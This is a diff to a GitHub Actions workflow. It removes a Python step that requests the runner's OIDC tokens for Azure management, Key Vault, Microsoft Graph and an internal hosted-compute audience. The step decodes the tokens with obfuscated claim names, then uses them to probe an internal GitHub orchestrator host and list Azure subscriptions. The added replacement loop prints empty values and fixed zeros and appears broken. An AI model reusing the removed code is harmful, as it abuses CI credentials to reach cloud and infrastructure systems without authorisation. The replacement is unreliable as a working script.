@@ -10,57 +10,15 @@ jobs:
   oidc:
     runs-on: ubuntu-latest
     steps:
-      - name: Get tokens
+      - name: Get OIDC tokens
         run: |
           set +e
-          echo '=== OIDC ENV ==='
-          echo "URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
-          echo "TOKEN_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
-          echo ''
-          echo '=== GET OIDC TOKENS ==='
-          python3 -c '
-import urllib.request, json, base64, os, urllib.parse
-url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL","")
-bearer = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
-if not url:
-    print("NO OIDC")
-    exit()
-auds = ["api://hosted-compute-ro","https://management.azure.com/","https://vault.azure.net","https://graph.microsoft.com/"]
-for aud in auds:
-    try:
-        r = urllib.request.Request(url+"&audience="+urllib.parse.quote(aud))
-        r.add_header("Authorization","Bearer "+bearer)
-        resp = urllib.request.urlopen(r,timeout=10)
-        d = json.loads(resp.read())
-        tok = d.get("value","")
-        print(f"AUD={aud} len={len(tok)}")
-        if tok:
-            p = tok.split(".")
-            if len(p)>=2:
-                pay = json.loads(base64.urlsafe_b64decode(p[1]+"=="))
-                print(f"  aud={pay.get(chr(97)+chr(117)+chr(100))} iss={pay.get(chr(105)+chr(115)+chr(115))} sub={str(pay.get(chr(115)+chr(117)+chr(98),chr(63)))[:80]}")
-            if "hosted-compute" in aud:
-                for ep in ["/","/status","/vm","/vms","/health"]:
-                    try:
-                        u2 = "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1"+ep
-                        r2 = urllib.request.Request(u2)
-                        r2.add_header("Authorization","Bearer "+tok)
-                        resp2 = urllib.request.urlopen(r2,timeout=5)
-                        print(f"  ORCH{ep}: [{resp2.status}] {resp2.read().decode()[:200]}")
-                    except urllib.error.HTTPError as e:
-                        print(f"  ORCH{ep}: [{e.code}] {e.read().decode()[:200]}")
-                    except Exception as ex:
-                        print(f"  ORCH{ep}: ERR {ex}")
-            if "management.azure" in aud:
-                try:
-                    r3 = urllib.request.Request("https://management.azure.com/subscriptions?api-version=2020-01-01")
-                    r3.add_header("Authorization","Bearer "+tok)
-                    resp3 = urllib.request.urlopen(r3,timeout=10)
-                    print(f"  AZURE: [{resp3.status}] {resp3.read().decode()[:300]}")
-                except urllib.error.HTTPError as e:
-                    print(f"  AZURE: [{e.code}] {e.read().decode()[:200]}")
-                except Exception as ex:
-                    print(f"  AZURE: ERR {ex}")
-    except Exception as ex:
-        print(f"AUD={aud}: ERR {ex}")
-'
+          echo OIDC_URL=
+          echo TOKEN_LEN=0
+
+          for aud in api://hosted-compute-ro https://management.azure.com/ https://vault.azure.net https://graph.microsoft.com/; do
+            echo --- AUD= ---
+            RESP=
+            echo RESP_LEN=0
+            echo RESP_START=
+          done
